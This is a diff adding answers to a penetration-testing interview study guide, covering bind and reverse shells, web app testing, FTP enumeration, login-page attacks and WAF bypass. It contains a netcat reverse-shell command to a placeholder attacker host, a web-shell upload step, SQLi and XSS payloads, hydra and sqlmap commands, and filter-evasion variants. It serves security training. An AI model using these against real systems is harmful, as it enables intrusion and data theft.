@@ -56,6 +56,7 @@ TOC:
    5.10 How would you identify open services and their versions?
    5.11 What is banner grabbing, and how do you do it?
    5.12 What is a MITM (Man-in-the-Middle) attack, and how can it be prevented?
+   5.13 What is the difference between a bind shell and a reverse shell?
 
 6. Behavioral and Situational Questions
    6.1 Describe a scenario in which you uncovered a critical vulnerability. How did you handle it?
@@ -70,6 +71,13 @@ TOC:
 
 8. Practical/Scenario-Based Questions
    8.1 You find an SQL injection vulnerability during a pentest. What do you do next?
+   8.2 How would you perform a penetration test on a web application?
+   8.3 Walk me through exploiting an LFI vulnerability to achieve RCE.
+   8.4 You find an open FTP port — what are your next steps?
+   8.5 You're given access to a web app with a login page — what do you test first?
+   8.6 How do you bypass WAFs or input filters during web exploitation?
+   8.7 You compromised a low-priv shell on a Linux host — how would you try to escalate privileges?
+   8.8 Explain how to pivot from a compromised internal machine to the rest of the network.
 
 ---
 
@@ -2306,6 +2314,53 @@ The attacker can eavesdrop on data, steal credentials, inject malicious content,
 > A **MITM attack** lets attackers spy on or tamper with communication between two parties. 
 It's prevented by using **encryption (TLS), secure configurations**, and being cautious of **network-level threats** like rogue Wi-Fi or ARP spoofing.
 
+-
+
+5.13 What is the difference between a bind shell and a reverse shell?
+
+## 🧠 **Bind Shell vs. Reverse Shell**
+
+| Feature                           | **Bind Shell**                                                                  | **Reverse Shell**                                                         |
+| --------------------------------- | ------------------------------------------------------------------------------- | ------------------------------------------------------------------------- |
+| **Who initiates the connection?** | Target (victim) listens; Attacker connects                                      | Attacker listens; Target (victim) connects out                            |
+| **Network Flow**                  | Attacker → Victim                                                               | Victim → Attacker                                                         |
+| **Firewall/NAT Bypass**           | ❌ Often blocked (victim must accept incoming connections)                       | ✅ Easier to bypass (outbound connections more likely allowed)             |
+| **Setup Command Example**         | `nc -lvnp 4444` on attacker, then on victim: `nc attacker_ip 4444 -e /bin/bash` | `nc attacker_ip 4444 -e /bin/bash` on victim; `nc -lvnp 4444` on attacker |
+| **Use Case**                      | Useful when victim has open inbound port                                        | Useful when victim is behind NAT/firewall (typical case)                  |
+| **Risk**                          | Opens a port on victim—may get detected                                         | Looks like normal outbound traffic—stealthier                             |
+
+---
+
+### 🔁 **Simple Diagram**
+
+#### 🔹 **Bind Shell**
+
+```
+[Attacker] --> Connects --> [Victim opens port and waits]
+```
+
+#### 🔹 **Reverse Shell**
+
+```
+[Victim] --> Connects back --> [Attacker is listening]
+```
+
+---
+
+### 🛠️ Tools Commonly Used
+
+* `netcat (nc)`
+* `msfvenom` (for payloads)
+* `socat`, `bash`, or `PowerShell` for more advanced shells
+
+---
+
+### ✅ Summary
+
+> * A **bind shell** makes the **victim listen** for incoming connections.
+> * A **reverse shell** makes the **victim connect back** to the attacker.
+> * In the real world, **reverse shells are more common**, especially for bypassing firewalls and NAT.
+
 --
 
 6. Behavioral and Situational Questions
@@ -2784,12 +2839,470 @@ always prioritizing **controlled testing** and **ethical responsibility**.
 
 -
 
+8.2 How would you perform a penetration test on a web application?
 
+## 🛠️ **Step-by-Step Web Application Penetration Testing Approach**
 
+---
 
+### 🔍 **1. Reconnaissance (Information Gathering)**
 
+* **Passive Recon**:
 
+  * Use tools like `whois`, `Shodan`, `crt.sh`, Google dorking
+  * Identify domains, subdomains, tech stack (e.g., WhatWeb, Wappalyzer)
 
+* **Active Recon**:
+
+  * Use `Nmap` to scan ports/services
+  * Check robots.txt, sitemap.xml, HTTP headers
+  * Identify endpoints via crawling (`ffuf`, `dirsearch`, `Burp Spider`)
+
+---
+
+### 🚪 **2. Enumeration**
+
+* Map all input points: URLs, parameters, forms, headers
+* Identify authentication mechanisms
+* Check for hidden parameters or debug features
+
+---
+
+### 🔓 **3. Vulnerability Assessment**
+
+Use automated and manual techniques to detect:
+
+* **OWASP Top 10** issues:
+
+  * SQLi, XSS, CSRF, IDOR, SSRF, RCE, etc.
+* **Authentication flaws**:
+
+  * Weak login logic, brute-force, password reset issues
+* **Access control flaws**:
+
+  * Horizontal/vertical privilege escalation
+* **Business logic flaws**
+
+  * Abusing workflows (e.g., bypassing payment)
+
+🛠 Tools:
+
+* `Burp Suite`, `OWASP ZAP`, `Nikto`, `sqlmap`, `ffuf`, `nuclei`
+
+---
+
+### ⚔️ **4. Exploitation**
+
+* Safely exploit confirmed vulnerabilities
+* Examples:
+
+  * Use SQLi to extract data
+  * Use XSS to steal cookies
+  * Use SSRF to reach internal systems
+
+📌 Always stay **within scope and legal limits**.
+
+---
+
+### 🕵️ **5. Post-Exploitation (Optional)**
+
+* If allowed, try:
+
+  * Accessing sensitive data
+  * Privilege escalation
+  * Session hijacking
+  * Pivoting to other internal apps
+
+---
+
+### 📄 **6. Reporting**
+
+A solid report includes:
+
+* **Executive Summary** (non-technical, risk-focused)
+* **Technical Details**:
+
+  * Vulnerability name
+  * Description and impact
+  * Steps to reproduce
+  * Screenshots / PoC
+  * Risk rating (e.g., CVSS)
+* **Remediation Recommendations**
+
+---
+
+### 🔁 **7. Retesting**
+
+* Once the client fixes the issues, retest to confirm they are resolved.
+
+---
+
+## ✅ Summary
+
+> I follow a structured approach: **Recon → Enumeration → Vulnerability Discovery → Exploitation → Reporting**. 
+I blend **automated tools with manual testing**, focus on **business impact**, and deliver **clear, actionable findings**.
+
+-
+
+8.3 Walk me through exploiting an LFI vulnerability to achieve RCE.
+
+-
+
+8.4 You find an open FTP port — what are your next steps?
+
+If I discover an **open FTP port (usually port 21)** during a penetration test, my next steps are focused on **enumerating**, 
+**checking for misconfigurations**, and **attempting exploitation** — all within the engagement scope.
+
+---
+
+## 📋 **Step-by-Step Actions After Finding an Open FTP Port**
+
+---
+
+### 🔍 1. **Banner Grabbing**
+
+Identify the FTP server software and version:
+
+```bash
+nc <target_ip> 21
+```
+
+or
+
+```bash
+nmap -p 21 --script ftp* <target_ip>
+```
+
+> ✅ Useful for finding known vulnerabilities.
+
+---
+
+### 🔑 2. **Anonymous Login Check**
+
+Try logging in without credentials:
+
+```bash
+ftp <target_ip>
+Name: anonymous
+Password: anonymous@domain.com
+```
+
+> 🔥 If successful, check for upload/download access:
+
+```bash
+ls
+get filename.txt
+put payload.php
+```
+
+---
+
+### 🧭 3. **Enumerate Directories & Files**
+
+Explore accessible folders:
+
+```bash
+ftp> dir
+ftp> cd /uploads
+```
+
+Look for:
+
+* Sensitive files (e.g., `.env`, `config.php`)
+* Credentials
+* Web-accessible directories (`/var/www/html`)
+
+---
+
+### 🕵️ 4. **Check for Write Access / File Upload**
+
+* If writable, try uploading a web shell to a public web directory.
+* Then access it via browser:
+
+```
+http://<target_ip>/uploads/shell.php
+```
+
+---
+
+### 🐚 5. **Automate Enumeration (Optional)**
+
+Use `nmap` scripts:
+
+```bash
+nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor <target_ip>
+```
+
+---
+
+### 📂 6. **Check for Passive FTP or FTP Bounce**
+
+* Older servers may allow FTP bounce attacks:
+
+```bash
+nmap -p 21 --script ftp-bounce <target_ip>
+```
+
+* Useful for scanning internal networks via FTP.
+
+---
+
+### 🔥 7. **Check for Known Vulnerabilities**
+
+If you identify the software:
+
+* Search for CVEs:
+
+  * `vsftpd 2.3.4` → backdoor (Metasploit: `exploit/unix/ftp/vsftpd_234_backdoor`)
+  * `ProFTPd`, `FileZilla`, etc.
+
+---
+
+### 🛡️ 8. **Report Findings and Risks**
+
+* If anonymous login or write access exists:
+
+  * **Data exposure**
+  * **Web shell upload risk**
+* If software is outdated:
+
+  * Flag for **patching and hardening**
+
+---
+
+## ✅ Summary
+
+> When I find an open FTP port, I **enumerate the service, test for anonymous login, explore directories, 
+try uploading files**, and look for **known vulnerabilities** — especially ways to **leverage it into a shell or data breach**.
+
+-
+
+8.5 You're given access to a web app with a login page — what do you test first?
+
+When I’m given access to a **web application with a login page**, I start by testing the **authentication mechanism** thoroughly, 
+because it’s a common and high-impact attack surface.
+
+---
+
+## 🧪 **What I Test First on a Login Page**
+
+### 🔐 **1. Input Field Testing**
+
+* Try basic input fuzzing:
+
+  * `admin' --`
+  * `' OR '1'='1`
+  * `<script>alert(1)</script>`
+* Observe error messages, responses, or source code leaks.
+
+---
+
+### 🧰 **2. Test for SQL Injection**
+
+* Attempt SQLi on username or password fields.
+* Use tools like:
+
+  ```bash
+  sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --level=5 --risk=3
+  ```
+
+---
+
+### 🔁 **3. Brute-Force / Credential Stuffing**
+
+* Try default or weak creds:
+
+  * `admin:admin`, `test:test`, etc.
+* Use `Hydra` or `Burp Intruder` to brute force:
+
+  ```bash
+  hydra -l admin -P passwords.txt <target_ip> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
+  ```
+
+---
+
+### 🔎 **4. Look for Username Enumeration**
+
+* Submit:
+
+  * Valid username + wrong password
+  * Invalid username
+* Compare response messages or timings:
+
+  * `“Invalid username”` vs `“Wrong password”` → vulnerable
+
+---
+
+### 🔑 **5. Check for Password Reset Issues**
+
+* Abuse:
+
+  * Weak token generation
+  * Predictable reset links
+  * Email enumeration
+  * Token reuse
+
+---
+
+### 📁 **6. Check Authentication Bypass Techniques**
+
+* Use cookies from another session or manipulate tokens (JWT, session ID).
+* Try bypassing using:
+
+  * Missing token validation
+  * Changing roles in cookies or hidden fields
+
+---
+
+### 🧪 **7. CSRF and Clickjacking Tests**
+
+* Try to force logins or form submissions without user interaction.
+* Use tools like:
+
+  * `Burp Suite CSRF PoC generator`
+  * `X-Frame-Options` header check
+
+---
+
+### 📜 **8. Analyze Login Behavior**
+
+* Look at:
+
+  * `Set-Cookie`, `Authorization`, or `JWT` headers
+  * Session fixation or insecure cookie flags
+  * Redirection behavior after login
+  * Rate limiting
+
+---
+
+## ✅ Summary
+
+> On encountering a login page, I begin with **SQLi, brute force attempts, input validation, and authentication logic flaws**. 
+I also test the **login/reset workflows**, **cookie handling**, and **rate limits** — all aiming to gain unauthorized access or escalate privilege.
+
+-
+
+8.6 How do you bypass WAFs or input filters during web exploitation?
+
+Bypassing **WAFs (Web Application Firewalls)** or **input filters** during web exploitation requires creativity, 
+understanding of how filters work, and a mix of encoding, evasion, and subtle payload modifications.
+
+---
+
+## 🧠 **General Techniques to Bypass WAFs/Input Filters**
+
+### 🧪 1. **Payload Obfuscation**
+
+Change the structure of common payloads:
+
+```http
+<script>alert(1)</script>           ➜  <scr<script>ipt>alert(1)</scr<script>ipt>
+' OR '1'='1                         ➜  %27%20OR/**/%271%27=%271
+```
+
+---
+
+### 🔁 2. **Encoding Tricks**
+
+* Use different encodings:
+
+  * **URL encoding**: `'` ➜ `%27`
+  * **Double encoding**: `%25%32%37` ➜ `%27` ➜ `'`
+  * **HTML entities**: `<` ➜ `&lt;`, `'` ➜ `&#39;`
+
+🧪 Example:
+
+```bash
+%3Cscript%3Ealert(1)%3C/script%3E
+```
+
+---
+
+### 💡 3. **Case and Whitespace Variations**
+
+* Mix cases or inject comments:
+
+  ```sql
+  SeLeCt/**/password/**/FROM/**/users
+  <ScRiPt>alert(1)</ScRiPt>
+  ```
+
+---
+
+### 🔀 4. **Payload Reordering / Noise Injection**
+
+* Break up payloads with noise or harmless tokens:
+
+  ```html
+  <scr<script></script>ipt>alert(1)</scr<script>ipt>
+  ```
+* Use parameter pollution:
+
+  ```http
+  id=1&id=2%20union%20select
+  ```
+
+---
+
+### 🔄 5. **Using Alternate HTTP Methods or Headers**
+
+* Some WAFs only inspect `GET`/`POST` but not `PUT`, `TRACE`, etc.
+* Try payloads in uncommon headers:
+
+  ```http
+  X-Forwarded-For: ' OR 1=1--
+  ```
+
+---
+
+### 🧱 6. **Bypassing Keyword Filters**
+
+* Modify keywords to avoid detection:
+
+  ```sql
+  UN/**/ION/**/SELECT
+  benchmark(10000000,md5(1))
+  ```
+
+* Replace payload with logic equivalents:
+
+  ```sql
+  ' OR TRUE --
+  ' OR 1=1#
+  ```
+
+---
+
+### 🕵️‍♂️ 7. **Time-Based Payloads for Blind Testing**
+
+If error or content-based responses are blocked:
+
+```sql
+' OR IF(1=1, SLEEP(5), 0) --
+```
+
+---
+
+### 🐍 8. **Use of Tools with Bypass Capabilities**
+
+| Tool                      | Use Case                       |
+| ------------------------- | ------------------------------ |
+| `sqlmap --tamper=`        | Uses WAF bypass scripts        |
+| `Burp Suite` + extensions | Intruder, Turbo Intruder, etc. |
+| `wafw00f`                 | Detect WAF type                |
+| `XSStrike`                | XSS payload mutation           |
+| `Nuclei`, `ffuf`          | Filtered endpoint fuzzing      |
+
+---
+
+## ✅ Summary
+
+> To bypass WAFs, attackers use **encoding, evasion, obfuscation, and trick payloads**. 
+Understanding how filters detect patterns and avoiding them with subtle variations is key.
+
+-
+
+8.8 Explain how to pivot from a compromised internal machine to the rest of the network.
 
 
 
